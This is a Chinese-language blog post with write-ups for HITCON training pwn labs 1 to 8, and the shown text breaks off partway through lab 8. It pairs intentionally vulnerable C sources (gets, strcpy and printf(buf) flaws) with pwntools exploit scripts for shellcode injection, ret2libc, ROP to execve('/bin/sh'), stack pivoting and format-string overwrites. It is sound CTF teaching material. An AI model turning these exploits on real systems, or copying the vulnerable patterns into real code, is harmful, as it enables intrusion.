<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>HITCONtraining - Lab on Mercury</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Lab on Mercury"><meta name="msapplication-TileImage" content="/img/favicon.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Lab on Mercury"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="HITCONtraining更新完成，没咕咕。其中堆题真是很适合入门。"><meta property="og:type" content="blog"><meta property="og:title" content="HITCONtraining"><meta property="og:url" content="https://signormercurio.me/post/HITCONtraining/"><meta property="og:site_name" content="Lab on Mercury"><meta property="og:description" content="HITCONtraining更新完成，没咕咕。其中堆题真是很适合入门。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://signormercurio.me/img/og_image.png"><meta property="article:published_time" content="2020-02-16T12:32:19.000Z"><meta property="article:author" content="Mercury"><meta property="article:tag" content="栈迁移"><meta property="article:tag" content="fsb"><meta property="article:tag" content="uaf"><meta property="article:tag" content="double-free"><meta property="article:tag" content="C/C++"><meta property="article:tag" content="ROP"><meta property="article:tag" content="off-by-one"><meta property="article:tag" content="unlink"><meta property="article:tag" content="House-of-Force"><meta property="article:tag" content="ORW"><meta property="article:tag" content="unsortedbin-attack"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://signormercurio.me/post/HITCONtraining/"},"headline":"Lab on Mercury","image":["https://signormercurio.me/img/og_image.png"],"datePublished":"2020-02-16T12:32:19.000Z","author":{"@type":"Person","name":"Mercury"},"description":"HITCONtraining更新完成，没咕咕。其中堆题真是很适合入门。"}</script><link rel="canonical" href="https://signormercurio.me/post/HITCONtraining/"><link rel="alternate" href="/atom.xml" title="Lab on Mercury" type="application/atom+xml"><link rel="icon" href="/img/favicon.png"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.css"><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/favicon.png" alt="Lab on Mercury" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2020-02-16T12:32:19.000Z" title="2020-02-16T12:32:19.000Z">2020-02-16</time></span><span class="level-item"><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/">安全</a><span> / </span><a class="link-muted" href="/categories/%E5%AE%89%E5%85%A8/Pwn/">Pwn</a></span><span class="level-item">32 minutes read (About 4855 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">HITCONtraining</h1><div class="content"><p>HITCONtraining更新完成，没咕咕。其中堆题真是很适合入门。</p>
<a id="more"></a>

<h2 id="lab1-sysmagic"><a href="#lab1-sysmagic" class="headerlink" title="lab1 - sysmagic"></a>lab1 - sysmagic</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> fd ;</span><br><span class="line">	<span class="keyword">int</span> password;</span><br><span class="line">	<span class="keyword">int</span> magic ;</span><br><span class="line">	<span class="keyword">char</span> key[] = <span class="string">&quot;Do_you_know_why_my_teammate_Orange_is_so_angry???&quot;</span>;</span><br><span class="line">	<span class="keyword">char</span> cipher[] = &#123;<span class="number">7</span>, <span class="number">59</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">11</span>, <span class="number">16</span>, <span class="number">61</span>, <span class="number">30</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">18</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">89</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">30</span>, <span class="number">22</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">85</span>, <span class="number">22</span>, <span class="number">8</span>, <span class="number">31</span>, <span class="number">7</span>, <span class="number">1</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">126</span>, <span class="number">28</span>, <span class="number">62</span>, <span class="number">10</span>, <span class="number">30</span>, <span class="number">11</span>, <span class="number">107</span>, <span class="number">4</span>, <span class="number">66</span>, <span class="number">60</span>, <span class="number">44</span>, <span class="number">91</span>, <span class="number">49</span>, <span class="number">85</span>, <span class="number">2</span>, <span class="number">30</span>, <span class="number">33</span>, <span class="number">16</span>, <span class="number">76</span>, <span class="number">30</span>, <span class="number">66</span>&#125;;</span><br><span class="line">	fd = open(<span class="string">&quot;/dev/urandom&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	read(fd,&amp;password,<span class="number">4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Give me maigc :&quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;magic);</span><br><span class="line">	<span class="keyword">if</span>(password == magic)&#123;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; <span class="keyword">sizeof</span>(cipher) ; i++)&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,cipher[i]^key[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	get_flag();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p><code>/dev/urandom</code>的随机数是很难预测的，因此我们只能想办法让<code>if</code>条件判断失效。可以用IDA将对应的<code>jnz</code>语句patch成<code>jz</code>就可以打印flag了。当然也可以gdb设置<code>eip</code>跳过这个<code>jnz</code>。</p>
<h2 id="lab2-orw"><a href="#lab2-orw" class="headerlink" title="lab2 - orw"></a>lab2 - orw</h2><p>本题没有提供源码。开了seccomp沙箱，只能用orw写shellcode，题目会自动执行写入的shellcode。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">binary = <span class="string">&#x27;./orw.bin&#x27;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">p = process(binary)</span><br><span class="line"></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>,<span class="number">0</span>) + shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>) + shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">100</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,asm(shellcode))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="lab3-ret2sc"><a href="#lab3-ret2sc" class="headerlink" title="lab3 - ret2sc"></a>lab3 - ret2sc</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> name[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,name,<span class="number">50</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Try your best:&quot;</span>);</span><br><span class="line">	gets(buf);</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有开启NX，因此第一次输入可以输入shellcode放在bss段，第二次输入栈溢出返回到shellcode所在地址。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./ret2sc&#x27;</span></span><br><span class="line">context.binary = binary</span><br><span class="line">p = process(binary)</span><br><span class="line"></span><br><span class="line">name = <span class="number">0x804a060</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,asm(shellcraft.sh()))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>,name))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="lab4-ret2lib"><a href="#lab4-ret2lib" class="headerlink" title="lab4 - ret2lib"></a>lab4 - ret2lib</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">See_something</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> addr)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> *address ;</span><br><span class="line">	address = (<span class="keyword">int</span> *)addr ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;The content of the address : %p\n&quot;</span>,*address);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Print_message</span><span class="params">(<span class="keyword">char</span> *mesg)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">48</span>];</span><br><span class="line">	<span class="built_in">strcpy</span>(buf,mesg);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your message is : %s&quot;</span>,buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> address[<span class="number">10</span>] ;</span><br><span class="line">	<span class="keyword">char</span> message[<span class="number">256</span>];</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> addr ;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Do you know return to library ?&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;###############################&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;What do you want to see in memory?&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Give me an address (in dec) :&quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	read(<span class="number">0</span>,address,<span class="number">10</span>);</span><br><span class="line">	addr = strtol(address);</span><br><span class="line">	See_something(addr) ;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Leave some message for me :&quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	read(<span class="number">0</span>,message,<span class="number">256</span>);</span><br><span class="line">	Print_message(message);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Thanks you ~&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>经典的ret2libc题目，第一次输入可以直接泄露GOT地址，第二次栈溢出返回到<code>system(&quot;/bin/sh&quot;)</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">puts = <span class="built_in">int</span>(ru(<span class="string">&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line">base,libc,system = leak_libc(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line"></span><br><span class="line">binsh = base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">60</span>,system,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh))</span><br></pre></td></tr></table></figure>

<h2 id="lab5-simplerop"><a href="#lab5-simplerop" class="headerlink" title="lab5 - simplerop"></a>lab5 - simplerop</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">20</span>];</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;ROP is easy is&#x27;nt it ?&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your input :&quot;</span>);</span><br><span class="line">	fflush(<span class="built_in">stdout</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序是静态链接的，其中有很多gadgets但没有<code>/bin/sh</code>，因此我们需要自己写到bss段上去，然后ret2syscall。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">read = <span class="number">0x806cd50</span></span><br><span class="line">pop_eax = <span class="number">0x80bae06</span></span><br><span class="line">pop_dcb = <span class="number">0x806e850</span></span><br><span class="line">int_80 = <span class="number">0x80493e1</span></span><br><span class="line"></span><br><span class="line">chain = [</span><br><span class="line">	<span class="string">&#x27;a&#x27;</span>*<span class="number">32</span>,</span><br><span class="line">	<span class="comment"># read(0,bss,8)</span></span><br><span class="line">	read,pop_dcb,<span class="number">0</span>,elf.bss(),<span class="number">8</span>,</span><br><span class="line">	<span class="comment"># execve(&#x27;/bin/sh&#x27;,0,0)</span></span><br><span class="line">	pop_dcb,<span class="number">0</span>,<span class="number">0</span>,elf.bss(),pop_eax,<span class="number">0xb</span>,int_80</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,flat(chain))</span><br><span class="line">s(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h2 id="lab6-migration"><a href="#lab6-migration" class="headerlink" title="lab6 - migration"></a>lab6 - migration</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count = <span class="number">1337</span> ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(count != <span class="number">1337</span>)</span><br><span class="line">		_exit(<span class="number">1</span>);</span><br><span class="line">	count++;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Try your best :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">64</span>);</span><br><span class="line">	<span class="keyword">return</span> ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置了<code>count</code>使得<code>main</code>不能执行第二次。这导致我们无法直接实现ret2libc，同时栈溢出的空间较小，放不下ROP链，因此考虑栈迁移。</p>
<p>首先通过<code>read</code>读取泄露libc的ROP链到<code>buf</code>，然后<code>leave_ret</code>迁移到<code>buf</code>。继续<code>read</code>读取<code>system(&quot;/bin/sh&quot;)</code>的ROP链到<code>fub</code>，然后<code>leave_ret</code>迁移到<code>fub</code>。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">buf = elf.bss()+<span class="number">0x300</span></span><br><span class="line">fub = elf.bss()+<span class="number">0x400</span></span><br><span class="line">leave_ret = <span class="number">0x8048418</span></span><br><span class="line">pop3 = <span class="number">0x8048569</span></span><br><span class="line">pop_ebx = <span class="number">0x804836d</span></span><br><span class="line"></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>,buf,elf.plt[<span class="string">&#x27;read&#x27;</span>],leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>)</span><br><span class="line">sa(<span class="string">&#x27;:\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = flat(fub,elf.plt[<span class="string">&#x27;puts&#x27;</span>],pop_ebx,elf.got[<span class="string">&#x27;puts&#x27;</span>],elf.plt[<span class="string">&#x27;read&#x27;</span>],leave_ret,<span class="number">0</span>,fub,<span class="number">0x100</span>)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">puts = u32(r(<span class="number">4</span>))</span><br><span class="line">base,libc,system = leak_libc(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,system,<span class="string">&#x27;a&#x27;</span>*<span class="number">4</span>,binsh)</span><br><span class="line">s(payload)</span><br></pre></td></tr></table></figure>

<h2 id="lab7-crack"><a href="#lab7-crack" class="headerlink" title="lab7 - crack"></a>lab7 - crack</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> password ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line">	<span class="keyword">char</span> input[<span class="number">16</span>];</span><br><span class="line">	<span class="keyword">int</span> fd ;</span><br><span class="line">	srand(time(<span class="literal">NULL</span>));</span><br><span class="line">	fd = open(<span class="string">&quot;/dev/urandom&quot;</span>,<span class="number">0</span>);</span><br><span class="line">	read(fd,&amp;password,<span class="number">4</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;What your name ? &quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">99</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Hello ,&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your password :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,input,<span class="number">15</span>);</span><br><span class="line">	<span class="keyword">if</span>(atoi(input) != password)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Goodbyte&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Congrt!!&quot;</span>);</span><br><span class="line">		system(<span class="string">&quot;cat /home/crack/flag&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>存在格式化字符串漏洞，考虑利用该漏洞修改<code>password</code>为确定的值，然后输入该值即可。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span>(<span class="params">payload</span>):</span></span><br><span class="line">	io = process(binary)</span><br><span class="line">	io.sendlineafter(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">	io.recvuntil(<span class="string">&#x27;Hello ,&#x27;</span>)</span><br><span class="line">	info = io.recvline()</span><br><span class="line">	io.close()</span><br><span class="line">	<span class="keyword">return</span> info</span><br><span class="line">auto = FmtStr(exec_fmt)</span><br><span class="line"></span><br><span class="line">password = <span class="number">0x804a048</span></span><br><span class="line">payload = fmtstr_payload(auto.offset,&#123;password:<span class="number">1234</span>&#125;)</span><br><span class="line">sla(<span class="string">&#x27;?&#x27;</span>,payload)</span><br><span class="line">sla(<span class="string">&#x27;:&#x27;</span>,<span class="number">1234</span>)</span><br></pre></td></tr></table></figure>

<h2 id="lab8-craxme"><a href="#lab8-craxme" class="headerlink" title="lab8 - craxme"></a>lab8 - craxme</h2><p>源码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> magic = <span class="number">0</span> ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">0x100</span>];</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Please crax me !&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Give me magic :&quot;</span>);</span><br><span class="line">	read(<span class="number">0</span>,buf,<span class="number">0x100</span>);</span><br><span class="line">	<span class="built_in">printf</span>(buf);</span><br><span class="line">	<span class="keyword">if</span>(magic == <span class="number">0xda</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;cat /home/craxme/flag&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span> <span class="keyword">if</span>(magic == <span class="number">0xfaceb00c</span>)&#123;</span><br><span class="line">		system(<span class="string">&quot;cat /home/craxme/craxflag&quot;</span>);</span><br><span class="line">	